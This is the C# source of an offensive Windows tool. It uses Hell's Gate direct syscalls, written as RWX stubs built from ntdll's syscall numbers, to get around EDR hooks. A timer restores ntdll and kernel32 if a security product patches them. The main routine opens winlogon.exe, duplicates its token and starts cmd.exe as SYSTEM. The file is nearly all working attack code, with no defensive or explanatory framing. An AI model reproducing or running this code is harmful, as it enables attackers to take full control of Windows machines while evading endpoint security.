using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Linq;

internal static class Program
{
    #region Native Strukturen & Delegates

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;

        public static OBJECT_ATTRIBUTES Create()
        {
            return new OBJECT_ATTRIBUTES
            {
                Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES))
            };
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    // Process Access Rights
    private const uint PROCESS_ALL_ACCESS = 0x1FFFFF;

    // Token Access Rights
    private const uint TOKEN_QUERY = 0x0008;
    private const uint TOKEN_DUPLICATE = 0x0002;
    private const uint TOKEN_IMPERSONATE = 0x0004;
    private const uint TOKEN_ALL_ACCESS = 0xF01FF;

    // Memory Protection Constants
    private const uint PAGE_EXECUTE_READWRITE = 0x40;
    private const uint PAGE_EXECUTE_READ = 0x20;
    private const uint PAGE_READWRITE = 0x04;
    private const uint MEM_COMMIT = 0x1000;
    private const uint MEM_RESERVE = 0x2000;

    #endregion

    #region Win32 API

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CreateProcessAsUser(
        IntPtr hToken,
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool RevertToSelf();

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    private const uint CREATE_NEW_CONSOLE = 0x00000010;
    private const uint STARTF_USESHOWWINDOW = 0x00000001;
    private const short SW_SHOWNORMAL = 1;
    private const uint MEM_RELEASE = 0x8000;

    #endregion

    #region Hells Gate - Direkte Syscalls

    private static class HellsGate
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int NtOpenProcessDirect(ref IntPtr ProcessHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int NtOpenProcessTokenDirect(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int NtDuplicateTokenDirect(IntPtr ExistingTokenHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, bool EffectiveOnly, int TokenType, out IntPtr NewTokenHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int NtCloseDirect(IntPtr Handle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int NtQueryInformationTokenDirect(IntPtr TokenHandle, int TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int NtProtectVirtualMemoryDirect(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref ulong RegionSize, uint NewProtect, out uint OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate int NtFlushInstructionCacheDirect(IntPtr ProcessHandle, IntPtr BaseAddress, uint RegionSize);

        private static Dictionary<string, IntPtr> _syscallStubs = new Dictionary<string, IntPtr>();
        private static Dictionary<string, ushort> _syscallNumbers = new Dictionary<string, ushort>();

        public static bool Initialize()
        {
            Console.WriteLine("[Hells Gate] Initializing direct syscalls...");

            try
            {
                string ntdllPath = Path.Combine(Environment.SystemDirectory, "ntdll.dll");
                byte[] ntdllBytes = File.ReadAllBytes(ntdllPath);

                string[] syscalls = { "NtOpenProcess", "NtOpenProcessToken", "NtDuplicateToken",
                                      "NtClose", "NtQueryInformationToken", "NtProtectVirtualMemory",
                                      "NtFlushInstructionCache" };

                foreach (string syscall in syscalls)
                {
                    ushort ssn = ExtractSSNFromPE(ntdllBytes, syscall);
                    if (ssn != 0)
                    {
                        _syscallNumbers[syscall] = ssn;
                        CreateSyscallStub(syscall, ssn);
                        Console.WriteLine($"[Hells Gate] {syscall} -> SSN: {ssn}");
                    }
                }

                return _syscallStubs.Count > 0;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Hells Gate] Failed: {ex.Message}");
                return false;
            }
        }

        private static ushort ExtractSSNFromPE(byte[] peData, string functionName)
        {
            try
            {
                int e_lfanew = BitConverter.ToInt32(peData, 0x3C);
                int exportRVA = BitConverter.ToInt32(peData, e_lfanew + 0x88);
                if (exportRVA == 0) return 0;

                int numberOfNames = BitConverter.ToInt32(peData, exportRVA + 0x18);
                int addressOfNames = BitConverter.ToInt32(peData, exportRVA + 0x20);
                int addressOfNameOrdinals = BitConverter.ToInt32(peData, exportRVA + 0x24);
                int addressOfFunctions = BitConverter.ToInt32(peData, exportRVA + 0x1C);

                for (int i = 0; i < numberOfNames; i++)
                {
                    int nameRVA = BitConverter.ToInt32(peData, addressOfNames + i * 4);
                    string name = ReadStringFromPE(peData, nameRVA);

                    if (name == functionName)
                    {
                        short ordinal = BitConverter.ToInt16(peData, addressOfNameOrdinals + i * 2);
                        int functionRVA = BitConverter.ToInt32(peData, addressOfFunctions + ordinal * 4);
                        return ExtractSSNFromStub(peData, functionRVA);
                    }
                }
            }
            catch { }
            return 0;
        }

        private static string ReadStringFromPE(byte[] peData, int rva)
        {
            List<byte> bytes = new List<byte>();
            int offset = rva;
            while (offset < peData.Length && peData[offset] != 0)
            {
                bytes.Add(peData[offset]);
                offset++;
            }
            return Encoding.ASCII.GetString(bytes.ToArray());
        }

        private static ushort ExtractSSNFromStub(byte[] peData, int rva)
        {
            try
            {
                int offset = rva;
                for (int i = 0; i < 32 && offset + i < peData.Length - 4; i++)
                {
                    if (peData[offset + i] == 0xB8)
                    {
                        return BitConverter.ToUInt16(peData, offset + i + 1);
                    }
                }
            }
            catch { }
            return 0;
        }

        private static void CreateSyscallStub(string name, ushort ssn)
        {
            byte[] stub = new byte[]
            {
                0xB8, 0x00, 0x00, 0x00, 0x00,  // mov eax, ssn
                0x4C, 0x8B, 0xD1,              // mov r10, rcx
                0x0F, 0x05,                    // syscall
                0xC3                           // ret
            };

            byte[] ssnBytes = BitConverter.GetBytes((uint)ssn);
            Buffer.BlockCopy(ssnBytes, 0, stub, 1, 4);

            IntPtr stubAddr = VirtualAlloc(IntPtr.Zero, (uint)stub.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (stubAddr != IntPtr.Zero)
            {
                Marshal.Copy(stub, 0, stubAddr, stub.Length);
                _syscallStubs[name] = stubAddr;
            }
        }

        public static T GetSyscall<T>(string name) where T : class
        {
            if (_syscallStubs.ContainsKey(name))
            {
                return Marshal.GetDelegateForFunctionPointer<T>(_syscallStubs[name]);
            }
            return null;
        }

        public static void Cleanup()
        {
            foreach (var stub in _syscallStubs.Values)
            {
                VirtualFree(stub, 0, MEM_RELEASE);
            }
            _syscallStubs.Clear();
        }
    }

    #endregion

    #region Text Section Protector

    private static class TextSectionProtector
    {
        private static HellsGate.NtProtectVirtualMemoryDirect _ntProtect;
        private static HellsGate.NtFlushInstructionCacheDirect _ntFlush;
        private static Timer _protectionTimer;
        private static Dictionary<string, Tuple<IntPtr, int, byte[]>> _protectedSections = new Dictionary<string, Tuple<IntPtr, int, byte[]>>();

        public static void Initialize()
        {
            _ntProtect = HellsGate.GetSyscall<HellsGate.NtProtectVirtualMemoryDirect>("NtProtectVirtualMemory");
            _ntFlush = HellsGate.GetSyscall<HellsGate.NtFlushInstructionCacheDirect>("NtFlushInstructionCache");

            if (_ntProtect != null)
                Console.WriteLine("[Protector] Initialized");
            else
                Console.WriteLine("[Protector] Warning: NtProtectVirtualMemory not available");
        }

        private static IntPtr GetModuleBase(string moduleName)
        {
            foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
            {
                if (module.ModuleName.Equals(moduleName, StringComparison.OrdinalIgnoreCase))
                    return module.BaseAddress;
            }
            return IntPtr.Zero;
        }

        public static bool ProtectTextSection(string moduleName)
        {
            if (_ntProtect == null) return false;

            try
            {
                IntPtr moduleBase = GetModuleBase(moduleName);
                if (moduleBase == IntPtr.Zero) return false;

                int e_lfanew = Marshal.ReadInt32(moduleBase, 0x3C);
                short numberOfSections = Marshal.ReadInt16(moduleBase, e_lfanew + 0x06);
                int sizeOfOptionalHeader = Marshal.ReadInt16(moduleBase, e_lfanew + 0x14);
                IntPtr sectionHeaderPtr = (IntPtr)((long)moduleBase + e_lfanew + 0x18 + sizeOfOptionalHeader);

                for (int i = 0; i < numberOfSections; i++)
                {
                    string sectionName = Marshal.PtrToStringAnsi(sectionHeaderPtr, 8);
                    if (sectionName == ".text")
                    {
                        int virtualAddress = Marshal.ReadInt32(sectionHeaderPtr, 0x0C);
                        int sizeOfRawData = Marshal.ReadInt32(sectionHeaderPtr, 0x10);
                        IntPtr sectionStart = (IntPtr)((long)moduleBase + virtualAddress);

                        // Cleanen Zustand speichern
                        byte[] cleanBytes = new byte[sizeOfRawData];
                        Marshal.Copy(sectionStart, cleanBytes, 0, sizeOfRawData);

                        ulong regionSize = (ulong)sizeOfRawData;
                        IntPtr baseAddr = sectionStart;

                        int status = _ntProtect((IntPtr)(-1), ref baseAddr, ref regionSize, PAGE_EXECUTE_READ, out uint oldProtect);

                        if (status == 0)
                        {
                            _protectedSections[moduleName] = Tuple.Create(sectionStart, sizeOfRawData, cleanBytes);
                            Console.WriteLine($"[Protector] Protected {moduleName}.text (RX) - {sizeOfRawData} bytes");
                            return true;
                        }
                        else
                        {
                            Console.WriteLine($"[Protector] Failed to protect {moduleName}.text: 0x{status:X8}");
                        }
                        break;
                    }
                    sectionHeaderPtr = (IntPtr)((long)sectionHeaderPtr + 40);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Protector] Error: {ex.Message}");
            }
            return false;
        }

        public static void StartRehookProtection(int intervalMs = 3000)
        {
            if (_protectedSections.Count == 0)
            {
                Console.WriteLine("[Protector] No sections to protect");
                return;
            }

            Console.WriteLine($"[Protector] Starting re-hook protection (interval: {intervalMs}ms)");

            _protectionTimer = new Timer((state) =>
            {
                foreach (var kvp in _protectedSections)
                {
                    string name = kvp.Key;
                    IntPtr sectionStart = kvp.Value.Item1;
                    int sectionSize = kvp.Value.Item2;
                    byte[] cleanBytes = kvp.Value.Item3;

                    try
                    {
                        byte[] currentBytes = new byte[sectionSize];
                        Marshal.Copy(sectionStart, currentBytes, 0, sectionSize);

                        bool modified = false;
                        for (int i = 0; i < sectionSize && !modified; i++)
                        {
                            if (currentBytes[i] != cleanBytes[i])
                                modified = true;
                        }

                        if (modified)
                        {
                            Console.WriteLine($"[!] DETECTED: {name}.text was modified! Restoring...");

                            ulong regionSize = (ulong)sectionSize;
                            IntPtr baseAddr = sectionStart;
                            _ntProtect((IntPtr)(-1), ref baseAddr, ref regionSize, PAGE_READWRITE, out uint oldProtect);
                            Marshal.Copy(cleanBytes, 0, sectionStart, sectionSize);
                            _ntProtect((IntPtr)(-1), ref baseAddr, ref regionSize, PAGE_EXECUTE_READ, out oldProtect);
                            _ntFlush?.Invoke((IntPtr)(-1), sectionStart, (uint)sectionSize);

                            Console.WriteLine($"[Protector] Restored {name}.text");
                        }
                    }
                    catch { }
                }
            }, null, intervalMs, intervalMs);
        }

        public static void StopProtection()
        {
            _protectionTimer?.Dispose();
            Console.WriteLine("[Protector] Stopped re-hook protection");
        }
    }

    #endregion

    #region Token Information

    private enum TOKEN_INFORMATION_CLASS
    {
        TokenElevation = 20,
        TokenSessionId = 12,
        TokenIntegrityLevel = 25
    }

    private static HellsGate.NtQueryInformationTokenDirect _ntQueryInfoToken;

    private static void InitializeTokenSyscalls()
    {
        _ntQueryInfoToken = HellsGate.GetSyscall<HellsGate.NtQueryInformationTokenDirect>("NtQueryInformationToken");
    }

    private static int GetTokenSessionId(IntPtr hToken)
    {
        if (_ntQueryInfoToken == null) return -1;

        uint dwLen = 0;
        int status = _ntQueryInfoToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenSessionId, IntPtr.Zero, 0, out dwLen);
        if (status == 0 && dwLen > 0)
        {
            IntPtr pSessionId = Marshal.AllocHGlobal((int)dwLen);
            try
            {
                status = _ntQueryInfoToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenSessionId, pSessionId, dwLen, out dwLen);
                if (status == 0)
                    return Marshal.ReadInt32(pSessionId);
            }
            finally { Marshal.FreeHGlobal(pSessionId); }
        }
        return -1;
    }

    private static bool IsTokenElevated(IntPtr hToken)
    {
        if (_ntQueryInfoToken == null) return false;

        uint dwLen = 0;
        int status = _ntQueryInfoToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenElevation, IntPtr.Zero, 0, out dwLen);
        if (status == 0 && dwLen > 0)
        {
            IntPtr pElev = Marshal.AllocHGlobal((int)dwLen);
            try
            {
                status = _ntQueryInfoToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenElevation, pElev, dwLen, out dwLen);
                if (status == 0)
                    return Marshal.ReadInt32(pElev) != 0;
            }
            finally { Marshal.FreeHGlobal(pElev); }
        }
        return false;
    }

    private static uint GetTokenIntegrityLevel(IntPtr hToken)
    {
        if (_ntQueryInfoToken == null) return 0;

        uint dwLen = 0;
        int status = _ntQueryInfoToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, IntPtr.Zero, 0, out dwLen);
        if (status == 0 && dwLen > 0)
        {
            IntPtr pTIL = Marshal.AllocHGlobal((int)dwLen);
            try
            {
                status = _ntQueryInfoToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, pTIL, dwLen, out dwLen);
                if (status == 0)
                {
                    IntPtr pSid = Marshal.ReadIntPtr(pTIL);
                    IntPtr pCount = GetSidSubAuthorityCount(pSid);
                    if (pCount != IntPtr.Zero)
                    {
                        byte count = Marshal.ReadByte(pCount);
                        IntPtr pLevel = GetSidSubAuthority(pSid, (uint)(count - 1));
                        if (pLevel != IntPtr.Zero)
                            return (uint)Marshal.ReadInt32(pLevel);
                    }
                }
            }
            finally { Marshal.FreeHGlobal(pTIL); }
        }
        return 0;
    }

    [DllImport("advapi32.dll")]
    static extern IntPtr GetSidSubAuthorityCount(IntPtr pSid);

    [DllImport("advapi32.dll")]
    static extern IntPtr GetSidSubAuthority(IntPtr pSid, uint nSubAuthority);

    #endregion

    #region Helper

    private static uint FindWinLogonPid()
    {
        try
        {
            var processes = Process.GetProcessesByName("winlogon");
            if (processes.Length > 0)
            {
                return (uint)processes[0].Id;
            }
        }
        catch { }
        return 0;
    }

    #endregion

    #region Main

    public static void Main()
    {
        Console.WriteLine("[*] ===============================================");
        Console.WriteLine("[*] Advanced Module v12.0 - Hells Gate + Protector");
        Console.WriteLine("[*] ===============================================");
        Console.WriteLine();

        // 1. Hells Gate initialisieren
        if (!HellsGate.Initialize())
        {
            Console.WriteLine("[-] Hells Gate initialization failed!");
            Console.ReadKey();
            return;
        }
        Console.WriteLine();

        // 2. Text Section Protector initialisieren
        TextSectionProtector.Initialize();

        // 3. .text Sections schützen (EDR kann nicht mehr schreiben)
        Console.WriteLine("[*] Protecting critical modules...");
        TextSectionProtector.ProtectTextSection("ntdll.dll");
        TextSectionProtector.ProtectTextSection("kernel32.dll");
        Console.WriteLine();

        // 4. Re-Hook Protection starten (überwacht und restored)
        TextSectionProtector.StartRehookProtection(3000);
        Console.WriteLine();

        // 5. Token Syscalls initialisieren
        InitializeTokenSyscalls();

        // 6. Aktuelle Prozess-Identität
        var currentIdentity = WindowsIdentity.GetCurrent();
        bool isAdmin = new WindowsPrincipal(currentIdentity).IsInRole(WindowsBuiltInRole.Administrator);
        Console.WriteLine($"[*] Current User: {currentIdentity.Name}");
        Console.WriteLine($"[*] Admin Rights: {isAdmin}");

        if (!isAdmin)
        {
            Console.WriteLine("[-] This tool requires Administrator privileges!");
            Console.ReadKey();
            return;
        }
        Console.WriteLine();

        // 7. WinLogon Prozess finden
        Console.WriteLine("[*] Searching for winlogon.exe...");
        uint winlogonPid = FindWinLogonPid();

        if (winlogonPid == 0)
        {
            Console.WriteLine("[-] Could not find winlogon.exe!");
            Console.WriteLine("[*] Please enter PID manually: ");
            if (!uint.TryParse(Console.ReadLine(), out winlogonPid))
            {
                Console.WriteLine("[-] Invalid PID");
                Console.ReadKey();
                return;
            }
        }
        else
        {
            Console.WriteLine($"[+] Found winlogon.exe with PID: {winlogonPid}");
        }
        Console.WriteLine();

        try
        {
            var ntOpenProcess = HellsGate.GetSyscall<HellsGate.NtOpenProcessDirect>("NtOpenProcess");
            var ntOpenProcessToken = HellsGate.GetSyscall<HellsGate.NtOpenProcessTokenDirect>("NtOpenProcessToken");
            var ntDuplicateToken = HellsGate.GetSyscall<HellsGate.NtDuplicateTokenDirect>("NtDuplicateToken");
            var ntClose = HellsGate.GetSyscall<HellsGate.NtCloseDirect>("NtClose");

            if (ntOpenProcess == null || ntOpenProcessToken == null || ntDuplicateToken == null || ntClose == null)
            {
                Console.WriteLine("[-] Failed to get direct syscall delegates");
                Console.ReadKey();
                return;
            }

            Console.WriteLine("[+] Direct syscall delegates loaded (Hells Gate)");
            Console.WriteLine();

            // 1. WinLogon Prozess öffnen
            OBJECT_ATTRIBUTES objAttr = OBJECT_ATTRIBUTES.Create();
            CLIENT_ID clientId = new CLIENT_ID();
            clientId.UniqueProcess = (IntPtr)winlogonPid;
            clientId.UniqueThread = IntPtr.Zero;

            IntPtr hProcess = IntPtr.Zero;
            int status = ntOpenProcess(ref hProcess, PROCESS_ALL_ACCESS, ref objAttr, ref clientId);

            if (status != 0 || hProcess == IntPtr.Zero)
            {
                Console.WriteLine($"[-] NtOpenProcess failed: 0x{status:X8}");
                Console.ReadKey();
                return;
            }
            Console.WriteLine($"[+] WinLogon process opened (handle: 0x{hProcess.ToInt64():X})");

            // 2. Token aus WinLogon
            uint tokenAccess = TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE;
            status = ntOpenProcessToken(hProcess, tokenAccess, out IntPtr hTargetToken);

            if (status != 0 || hTargetToken == IntPtr.Zero)
            {
                Console.WriteLine($"[-] NtOpenProcessToken failed: 0x{status:X8}");
                ntClose(hProcess);
                Console.ReadKey();
                return;
            }
            Console.WriteLine($"[+] Token opened (handle: 0x{hTargetToken.ToInt64():X})");

            // 3. Token Info anzeigen
            if (_ntQueryInfoToken != null && hTargetToken != IntPtr.Zero)
            {
                bool isElevated = IsTokenElevated(hTargetToken);
                int session = GetTokenSessionId(hTargetToken);
                uint integrity = GetTokenIntegrityLevel(hTargetToken);

                Console.WriteLine($"[+] Token Info:");
                Console.WriteLine($"    - Elevated: {isElevated}");
                Console.WriteLine($"    - Session: {session}");
                Console.WriteLine($"    - Integrity: 0x{integrity:X}");
                Console.WriteLine();
            }

            // 4. Token duplizieren als Primary Token
            OBJECT_ATTRIBUTES dupAttr = OBJECT_ATTRIBUTES.Create();
            status = ntDuplicateToken(hTargetToken, TOKEN_ALL_ACCESS, ref dupAttr, false, 1, out IntPtr hPrimaryToken);

            if (status != 0 || hPrimaryToken == IntPtr.Zero)
            {
                Console.WriteLine($"[-] NtDuplicateToken failed: 0x{status:X8}");
                Console.WriteLine("[*] Using original token...");
                hPrimaryToken = hTargetToken;
                hTargetToken = IntPtr.Zero;
            }
            else
            {
                Console.WriteLine($"[+] Token duplicated (handle: 0x{hPrimaryToken.ToInt64():X})");
            }
            Console.WriteLine();

            // 5. cmd.exe mit SYSTEM Rechten starten
            Console.WriteLine("[*] ===============================================");
            Console.WriteLine("[*] Starting cmd.exe with SYSTEM token...");
            Console.WriteLine();

            bool processCreated = false;

            // Methode 1: ImpersonateLoggedOnUser + Process.Start
            if (ImpersonateLoggedOnUser(hPrimaryToken))
            {
                Console.WriteLine("[+] Impersonation successful!");
                try
                {
                    Process.Start("cmd.exe");
                    Console.WriteLine("[+] SUCCESS! cmd.exe started with SYSTEM privileges!");
                    processCreated = true;
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[-] Process.Start failed: {ex.Message}");
                }
                finally
                {
                    RevertToSelf();
                }
            }
            else
            {
                Console.WriteLine($"[-] Impersonation failed: {Marshal.GetLastWin32Error()}");
            }

            // Methode 2: CreateProcessAsUser (Fallback)
            if (!processCreated)
            {
                Console.WriteLine("[*] Trying CreateProcessAsUser...");

                STARTUPINFO si = new STARTUPINFO();
                si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
                si.dwFlags = STARTF_USESHOWWINDOW;
                si.wShowWindow = (ushort)SW_SHOWNORMAL;

                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

                bool success = CreateProcessAsUser(
                    hPrimaryToken,
                    null,
                    "cmd.exe",
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    CREATE_NEW_CONSOLE,
                    IntPtr.Zero,
                    null,
                    ref si,
                    out pi);

                if (success)
                {
                    Console.WriteLine($"[+] SUCCESS! cmd.exe started with PID: {pi.dwProcessId}");
                    processCreated = true;
                    CloseHandle(pi.hThread);
                    CloseHandle(pi.hProcess);
                }
                else
                {
                    Console.WriteLine($"[-] CreateProcessAsUser failed: {Marshal.GetLastWin32Error()}");
                }
            }

            if (processCreated)
            {
                Console.WriteLine();
                Console.WriteLine("[+] ===============================================");
                Console.WriteLine("[+] !!! SUCCESS !!!");
                Console.WriteLine("[+] A new cmd.exe is running with SYSTEM privileges!");
                Console.WriteLine("[+] ===============================================");
            }
            else
            {
                Console.WriteLine();
                Console.WriteLine("[-] ===============================================");
                Console.WriteLine("[-] Could not create process with SYSTEM token.");
                Console.WriteLine("[-] ===============================================");
            }

            // Cleanup
            if (hPrimaryToken != IntPtr.Zero && hPrimaryToken != hTargetToken)
                ntClose(hPrimaryToken);
            if (hTargetToken != IntPtr.Zero)
                ntClose(hTargetToken);
            if (hProcess != IntPtr.Zero)
                ntClose(hProcess);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Error: {ex.Message}");
            Console.WriteLine(ex.StackTrace);
        }

        Console.WriteLine();
        Console.WriteLine("[*] Press any key to exit (protection will stop)...");
        Console.ReadKey();

        TextSectionProtector.StopProtection();
        HellsGate.Cleanup();
    }

    #endregion
}
